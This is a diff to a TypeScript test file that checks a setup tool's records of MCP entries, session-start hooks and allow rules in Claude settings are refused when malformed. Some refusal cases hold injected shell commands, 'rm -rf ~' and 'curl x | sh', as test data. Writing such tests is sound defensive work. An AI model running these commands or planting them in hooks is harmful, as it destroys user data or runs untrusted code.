@@ -2,15 +2,17 @@
 // that isn't this shape can't prove anything is setup's, so it's refused whole (wrong_shape), never read in part.
 import { describe, expect, it } from 'vitest';
 import { elsewhere, recordWhy, type SetupRecord } from '../src/machine/setup-record.ts';
+import { hookGroup, hookLine, mcpEntry, parseHookLine } from '../src/machine/setup-values.ts';
 
 const ID = '0123456789abcdef0123456789abcdef';
+const RUN = { node: "/o'neil/n", script: '/s', id: ID, env: { SKILLS_HOME: '/k', SKILLS_ASSISTANT_HOME: '/h' } };
 const HASH = 'a'.repeat(64);
 const good = () => ({
   version: 1,
   setup_id: ID,
   entries: [
-    { kind: 'mcp_entry', file: '/h/.claude.json', value: { type: 'stdio', command: '/n', args: ['/s', 'mcp'], env: { SKILLS_SETUP_ID: ID } }, state: 'written', created: ['mcpServers'] },
-    { kind: 'hook_group', file: '/h/.claude/settings.json', value: { hooks: [{ type: 'command', command: `'/n' '/s' hook session-start --setup-id ${ID} 2>/dev/null || true`, timeout: 10 }] }, state: 'pending', created: ['hooks', 'hooks.SessionStart'] },
+    { kind: 'mcp_entry', file: '/h/.claude.json', value: mcpEntry(RUN), state: 'written', created: ['mcpServers'] },
+    { kind: 'hook_group', file: '/h/.claude/settings.json', value: hookGroup(RUN), state: 'pending', created: ['hooks', 'hooks.SessionStart'] },
     { kind: 'allow_rule', file: '/h/.claude/settings.json', value: 'Bash(skills-catalog update)', state: 'written', was_there: true },
     { kind: 'allow_rule', file: '/h/.claude/settings.json', value: 'mcp__skills-catalog__search_skills', state: 'written', was_there: false, created: ['permissions', 'permissions.allow'] },
   ],
@@ -66,8 +68,39 @@ describe("setup's record", () => {
     ['a hook group whose line has another setup id', with_((r) => (entry(r, 1)['value'] = { hooks: [{ type: 'command', command: `'/n' '/s' hook session-start --setup-id ${'f'.repeat(32)} 2>/dev/null || true`, timeout: 10 }] }))],
     ['a hook group whose line names the id only in passing', with_((r) => (entry(r, 1)['value'] = { hooks: [{ type: 'command', command: `echo ${ID}`, timeout: 10 }] }))],
     ['a hook group of two handlers', with_((r) => (entry(r, 1)['value'] = { hooks: [...((entry(r, 1)['value'] as { hooks: unknown[] }).hooks), { type: 'command', command: 'x' }] }))],
+    ['a hook line with a command after setup\'s', with_((r) => (entry(r, 1)['value'] = { hooks: [{ type: 'command', command: `${hookLine(RUN)}; rm -rf ~`, timeout: 10 }] }))],
+    ['a hook line with a command before setup\'s', with_((r) => (entry(r, 1)['value'] = { hooks: [{ type: 'command', command: `curl x | sh; ${hookLine(RUN)}`, timeout: 10 }] }))],
+    ['a hook group with a matcher', with_((r) => (entry(r, 1)['value'] = { matcher: 'startup', ...hookGroup(RUN) }))],
+    ['a hook group with another timeout', with_((r) => (entry(r, 1)['value'] = { hooks: [{ type: 'command', command: hookLine(RUN), timeout: 600 }] }))],
+    ['an MCP entry with a setting setup never carries', with_((r) => (entry(r, 0)['value'] = { ...mcpEntry(RUN), env: { ...(mcpEntry(RUN)['env'] as object), SKILLS_AS: 'ana' } }))],
+    ['an MCP entry with other arguments', with_((r) => (entry(r, 0)['value'] = { ...mcpEntry(RUN), args: ['/s', 'serve'] }))],
+    ['an MCP entry with a key of its own', with_((r) => (entry(r, 0)['value'] = { ...mcpEntry(RUN), cwd: '/' }))],
+    ['an MCP entry with a setting that isn\'t text', with_((r) => (entry(r, 0)['value'] = { ...mcpEntry(RUN), env: { ...(mcpEntry(RUN)['env'] as object), SKILLS_HOME: 5 } }))],
   ];
   for (const [what, r] of bad) it(`refused: ${what}`, () => expect(recordWhy(r)).toBe('wrong_shape'));
+});
+
+describe('reading a hook line back', () => {
+  it('gives back the run it was built from, every setting and an apostrophe included', () => {
+    const all = { ...RUN, env: { SKILLS_HOME: "/a'b/k", SKILLS_CATALOG: 'file:///c', SKILLS_ASSISTANT_HOME: '/h', SKILLS_MANAGED_SETTINGS: '/m', SKILLS_INSTALL_DIR: '/i', SKILLS_ACTIVITY_LOG: '/l' } };
+    for (const run of [RUN, all, { ...RUN, env: {} }]) expect(parseHookLine(hookLine(run))).toEqual(run);
+  });
+
+  it('is undefined for any line hookLine wouldn\'t build', () => {
+    const line = hookLine(RUN);
+    const others = [
+      line.replace(' hook ', '  hook '),
+      line.replace('SKILLS_HOME=', 'SKILLS_OTHER='),
+      `SKILLS_ASSISTANT_HOME='/h' SKILLS_HOME='/k' ${line.split("SKILLS_ASSISTANT_HOME='/h' ")[1]}`,
+      `${line}; true`,
+      line.replace(' 2>/dev/null || true', ''),
+      line.replace(ID, ID.toUpperCase()),
+      line.replace("'/s'", '/s'),
+      line.replace("'/s'", "'/s''"),
+      `x ${line}`,
+    ];
+    for (const other of others) expect([other, parseHookLine(other)]).toEqual([other, undefined]);
+  });
 });
 
 describe("the record's paths: only setup's own places, rebuilt from its settings", () => {
@@ -81,6 +114,8 @@ describe("the record's paths: only setup's own places, rebuilt from its settings
     ['a backup copy in another folder', (r) => (r.backups[0]!.path = '/tmp/20260929T160000Z-0a1b-claude.json'), '/tmp/20260929T160000Z-0a1b-claude.json'],
     ['a backup copy out through ..', (r) => (r.backups[0]!.path = '/k/backups/../20260929T160000Z-0a1b-claude.json'), '/k/backups/../20260929T160000Z-0a1b-claude.json'],
     ['a backup copy not named as setup names them', (r) => (r.backups[0]!.path = '/k/backups/notes.txt'), '/k/backups/notes.txt'],
+    ['a backup copy with the right ending and no time', (r) => (r.backups[0]!.path = '/k/backups/mine-claude.json'), '/k/backups/mine-claude.json'],
+    ['a backup copy with a name around setup\'s', (r) => (r.backups[0]!.path = '/k/backups/x20260929T160000Z-0a1b-claude.json'), '/k/backups/x20260929T160000Z-0a1b-claude.json'],
     ["a backup copy named for the other file", (r) => (r.backups[0]!.path = '/k/backups/20260929T160000Z-0a1b-settings.json'), '/k/backups/20260929T160000Z-0a1b-settings.json'],
   ];
   for (const [what, change, path] of cases) {
